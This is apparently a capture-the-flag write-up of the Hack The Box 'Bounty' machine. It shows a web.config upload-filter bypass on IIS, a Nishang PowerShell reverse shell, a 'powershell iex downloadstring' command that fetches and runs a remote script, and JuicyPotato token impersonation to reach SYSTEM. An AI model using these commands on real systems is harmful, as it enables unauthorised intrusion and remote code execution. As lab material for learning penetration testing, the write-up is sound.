![](http://vedanttare.com/wp-content/uploads/2022/04/Screenshot-2022-09-25-at-2.22.28-PM.png)

**IP address: 10.10.10.93**

## Enumeration

#### Using nmap to scan for open ports
```bash
sudo nmap -sC -sV -O -p- -oA nmap/bounty 10.10.10.93
```

Open ports:

- 80

So, as there was only port 80 open I just navigated to the IP and got the default page which was and image. I checked the page source but there was nothing. Then, I checked the image info and it had related text which showed IIS 7. The nmap scan though said that it was running IIS 7.5. Then, I checked on searchsploit for iis 7.5 vulns and found some, auth bypass to read sensitive files, etc, but none of them worked. Finally, I ran gobuster.

#### Using gobuster for directory fuzzing  
```bash
/UploadedFiles (Status: 301) │st canceled (Client.Timeout exceeded while awaiting headers)
/uploadedFiles (Status: 301) │Progress: 155722 / 220561 (70.60%)[ERROR] 2020/09/01 09:14:17 [!] Get http://10.10.10.93/191275: net/http: request ca
/uploadedfiles (Status: 301)
/aspnet_client
/aspnet_client/system_web
```

The default page after visiting the IP of the machine was:

![](http://vedanttare.com/wp-content/uploads/2022/04/default-page.png)

I visited these pages/dirs but got a 403 error which said that: YOU CANNOT ACCESS THIS PAGE AS YOU ARE NOT USING THE RIGHT CREDS…. Then as it was an IIS server, so, I thought of running gobuster with the extension flag of aspx through which I found a page:  
`transfer.aspx`

BOOM!!! This page had a file upload functionality where I could upload files. I tried uploading a simple aspx, asp file…but it said: `FILE NOT UPLOADED`  
I tried to bypass the filter by double extension and then when I tried to navigate to the file it showed that this page contains errors….. Then, I made a wordlist of all default extension and used burp intruder to bruteforce each one. It showed that jpeg, png and config(suspicious) was giving a successful upload.

After alot of sweat and tears and alot of googling I finally found an article which said that you could upload a web.config file to iis server 7/7.5 and embed asp code in it and execute it.  
https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/ –&gt; GODLY ARTICLE

Again, after alot of sweat and tears again I was able to get code execution. Now I had to upload a rev shell, so that I could get a rev connection back on my machine. I copied nishang poweshell rev shell script to my working directory:  
```bash
cp Invoke-PowerShellTcp.ps1
```

![](http://vedanttare.com/wp-content/uploads/2022/04/Screenshot-2022-04-15-at-1.46.29-PM.png)

At the end of the script I added:  
```bash
Invoke-PowershellTcp -Reverse -IPAddress 10.10.14.5 -Port 4444
```

![](http://vedanttare.com/wp-content/uploads/2022/04/Screenshot-2022-04-15-at-1.47.14-PM.png)  
By adding this it was telling the script to connect to my IP address and port. Then I modified my web.config file so that it would download the nishang powershell script and execute it. I setup a listener on my kali machine:  
AND BOOM!!!! I got a low priv shell!

```bash
kali@starscorp1o:~/htb/boxes/bounty$ sudo nc -nlvp 5555
[sudo] password for kali:
listening on [any] 5555 …
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.93] 49158
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.
```

```bash
PS C:\windows\system32\inetsrv>whoami
bounty\merlin
PS C:\windows\system32\inetsrv> systeminfo


Host Name: BOUNTY
OS Name: Microsoft Windows Server 2008 R2 Datacenter
OS Version: 6.1.7600 N/A Build 7600
OS Manufacturer: Microsoft Corporation
OS Configuration: Standalone Server
OS Build Type: Multiprocessor Free
Registered Owner: Windows User
Registered Organization:
Product ID: 55041-402-3606965-84760
Original Install Date: 5/30/2018, 12:22:24 AM
System Boot Time: 9/2/2020, 5:19:45 PM
System Manufacturer: VMware, Inc.
System Model: VMware Virtual Platform
System Type: x64-based PC
Processor(s): 1 Processor(s) Installed.
[01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory: C:\Windows
System Directory: C:\Windows\system32
Boot Device: \Device\HarddiskVolume1
System Locale: en-us;English (United States)
Input Locale: en-us;English (United States)
Time Zone: (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory: 2,047 MB
Available Physical Memory: 1,578 MB
Virtual Memory: Max Size: 4,095 MB
Virtual Memory: Available: 3,574 MB
Virtual Memory: In Use: 521 MB
Page File Location(s): C:\pagefile.sys
Domain: WORKGROUP
Logon Server: N/A
Hotfix(s): N/A
Network Card(s): 1 NIC(s) Installed.
[01]: Intel(R) PRO/1000 MT Network Connection
Connection Name: Local Area Connection
DHCP Enabled: No
```

## Privilege Escalation

I checked who I was:  
`bounty/merlin`

I went into merlin’s dir and tried to list the files but I couldn’t get the user.txt file as it wasn’t showing. Then I ran the following command to see hidden files:  
`attrib`  
And then i got the user flag:

```bash
PS C:\Users\merlin> cd Desktop
PS C:\Users\merlin\Desktop> dir
PS C:\Users\merlin\Desktop> attrib
A SH C:\Users\merlin\Desktop\desktop.ini
A H C:\Users\merlin\Desktop\user.txt
PS C:\Users\merlin\Desktop> type user.txt
e29ad89891462e0b09741e3082f44a2f
```

I checked the system information using:  
`systeminfo` command:

```bash
PS C:\windows\system32\inetsrv> systeminfo

Host Name: BOUNTY
OS Name: Microsoft Windows Server 2008 R2 Datacenter
OS Version: 6.1.7600 N/A Build 7600
OS Manufacturer: Microsoft Corporation
OS Configuration: Standalone Server
OS Build Type: Multiprocessor Free
Registered Owner: Windows User
Registered Organization:
Product ID: 55041-402-3606965-84760
Original Install Date: 5/30/2018, 12:22:24 AM
System Boot Time: 9/2/2020, 5:19:45 PM
System Manufacturer: VMware, Inc.
System Model: VMware Virtual PlatformSystem Type: x64-based PC
Processor(s): 1 Processor(s) Installed.
[01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory: C:\Windows
System Directory: C:\Windows\system32
Boot Device: \Device\HarddiskVolume1
System Locale: en-us;English (United States)
Input Locale: en-us;English (United States)
Time Zone: (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory: 2,047 MB
Available Physical Memory: 1,578 MB
Virtual Memory: Max Size: 4,095 MB
Virtual Memory: Available: 3,574 MB
Virtual Memory: In Use: 521 MB
Page File Location(s): C:\pagefile.sys
Domain: WORKGROUP
Logon Server: N/A
Hotfix(s): N/A
Network Card(s): 1 NIC(s) Installed.
[01]: Intel(R) PRO/1000 MT Network Connection
Connection Name: Local Area Connection
DHCP Enabled: No
IP address(es)
[01]: 10.10.10.93
```

![](http://vedanttare.com/wp-content/uploads/2022/04/userflag.png)

Now, I checked the privileges:  
using `whoami /priv` command:

```bash
whoami /priv

Privilege Name Description State
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token Enabled
SeIncreaseQuotaPrivilege Adjust memory quotas for a process Enabled
SeAuditPrivilege Generate security audits Enabled
SeChangeNotifyPrivilege Bypass traverse checking Enabled
SeImpersonatePrivilege Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Now we could see that the SeImpersonatePrivilege was enabled…this is very juicy…this leads to tokenhijacking…Juicypotato exploit is available for the esacalation of privileges for this…So I downloaded juicypotato.exe from github:

<https://github.com/ohpe/juicy-potato/releases>

Then, I already had a python web server hosted so I downloaded the file on my kali machine using the following command:

```bash
PS C:\Users\merlin\Desktop> (new-object net.webclient).downloadfile('http://10.10.14.5:/JuicyPotato.exe', 'C:\Users\merlin\Desktop\jp.exe')
```

![](http://vedanttare.com/wp-content/uploads/2022/04/pywebserver.png)

![](http://vedanttare.com/wp-content/uploads/2022/04/juicy-potato.png)

Now, I made a shell.bat file on my kali machine with the following code:

```bash
powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.5:/shell.ps1')
```

![](http://vedanttare.com/wp-content/uploads/2022/04/shellbat.png)

What this command does is that it downloads another powershell script and executes it but we will do that by using juicy potate exploit which will run it as root…

The final command:

```bash
PS C:\Users\merlin\Desktop> ./jp.exe -t * -p shell.bat -l 4444<br></br>Testing {4991d34b-80a1-4291-83b6-3328366b9097} 4444<br></br>….<br></br>[+] authresult 0<br></br>{4991d34b-80a1-4291-83b6-332`8366b9097};NT AUTHORITY\\SYSTEM

[+] CreateProcessWithTokenW OK
```

AND BOOM!!! We get root!!!!

```bash
kali@starscorp1o:~/htb/boxes/bounty$ sudo nc -nlvp 4444
[sudo] password for kali:
listening on [any] 4444 …
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.93] 49168
whoami
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>nt authority\system
PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> hostname
bounty
PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> whoami
whoami
```

![](http://vedanttare.com/wp-content/uploads/2022/04/got-root.png)

Important links and resources:

<https://github.com/Bengman/CTF-writeups/blob/master/Hackthebox/bounty.md>

<https://medium.com/@ranakhalil101/hack-the-box-bounty-writeup-w-o-metasploit-14467aea7815>
